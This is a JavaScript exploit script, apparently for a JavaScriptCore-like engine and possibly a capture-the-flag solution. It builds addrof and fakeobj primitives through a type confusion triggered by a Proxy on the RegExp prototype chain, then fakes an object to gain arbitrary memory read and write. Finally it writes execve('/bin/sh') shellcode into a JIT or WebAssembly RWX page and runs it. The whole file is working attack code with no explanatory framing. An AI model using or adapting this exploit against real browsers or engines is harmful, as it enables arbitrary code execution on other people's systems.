function initialize(){
	let regexp = new RegExp();
	let arrays = [];
	for (let i = 0; i < 100; i++){
		let x = [1.1, 2.2];
		x.__proto__ = regexp;
		arrays.push(x);
	}

	let fetchme = {};
	regexp.__proto__.__proto__ = new Proxy({}, {
		has() {
			confuse[0] = fetchme;
		}
	});

	function leak_opt(arr, reg) {
		0 in reg;
		return f2u(arr[0]);
	}

	function fake_opt(arr, reg, addr) {
		0 in reg;
		arr[0] = u2f(addr);
	}

	let confuse = Array.from([1.1]);
	let arr = arrays.pop();
	for (let i = 0; i < 10000; i++){
		leak_opt(confuse, arr);
		fake_opt(confuse, arr, 0xdeadbeef);
	}

	addrof = (obj) => {
		confuse = Array.from([1.1]);
		let reg = arrays.pop();
		fetchme = obj;
		delete reg[0];
		return leak_opt(confuse, reg);
	}

	fakeobj = (addr) => {
		confuse = Array.from([1.1]);
		let reg = arrays.pop();
		delete reg[0];
		fake_opt(confuse, reg, addr);
		return confuse[0];
	}
}

function init_aarw(){
	let spray = [];
	for(let i = 0; i < 200; i++){
		let x = [1.1];
		x['spray'+i] = i;
		spray.push(x)
	}

	let victim = [1.1];
	victim['target'] = 0;

	let container = {
		header : u2f(0x0108210700000000 + 400), 
		butterfly : victim,
	};
	let addr_container = addrof(container);
	let fake = fakeobj(addr_container + 0x10);

	read64 = (addr) => {
		fake[1] = u2f(addr + 0x10);
		return addrof(victim.target);
	}

	write64 = (addr, value) => {
		fake[1] = u2f(addr + 0x10);
		victim.target = u2f(value);
	}
}

function exploit_jit(){
	function jit(){
		return [];
	}

	for(let i = 0; i < 10000; i++)
		jit();

	let addr_function = addrof(jit);
	print(`[+] addr jit function : ${hex(addr_function)}`)
	let addr_executable = read64(addr_function + 0x18);
	print(`[+] addr executable   : ${hex(addr_executable)}`)
	let addr_JITCode = read64(addr_executable + 0x8);
	print(`[+] addr JITCode      : ${hex(addr_JITCode)}`)
	let addr_rwx = read64(addr_JITCode + 0x10);
	print(`[+] addr rwx area     : ${hex(addr_rwx)}`)

	let shellcode_str = '31d25248ba2f2f62696e2f7368524889e731f631d231c0b03b0f05';
	let shellcode = unhexlify(shellcode_str);

	payload = new Uint32Array(shellcode);
	for(let i = 0; i < payload.length; i++)
		write64(addr_rwx + 4*i, payload[i])

	print('[+] Go!')
	jit();
}

function exploit_wasm(){
	let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	let wasm_mod = new WebAssembly.Module(wasm_code);
	let wasm_instance = new WebAssembly.Instance(wasm_mod);
	let wasm_main = wasm_instance.exports.main;

	let addr_main = addrof(wasm_main);
	print(`[+] addr wasm function : ${hex(addr_main)}`)
	let addr_rwx = read64(addr_main + 0x38);
	print(`[+] addr rwx area      : ${hex(addr_rwx)}`)

	let shellcode_str = '31d25248ba2f2f62696e2f7368524889e731f631d231c0b03b0f05';
	let shellcode = unhexlify(shellcode_str);

	payload = new Uint32Array(shellcode);
	for(let i = 0; i < payload.length; i++)
		write64(addr_rwx + 4*i, payload[i])

	print('[+] Go!')
	wasm_main();
}

initialize();
init_aarw();
//exploit_jit();
exploit_wasm();
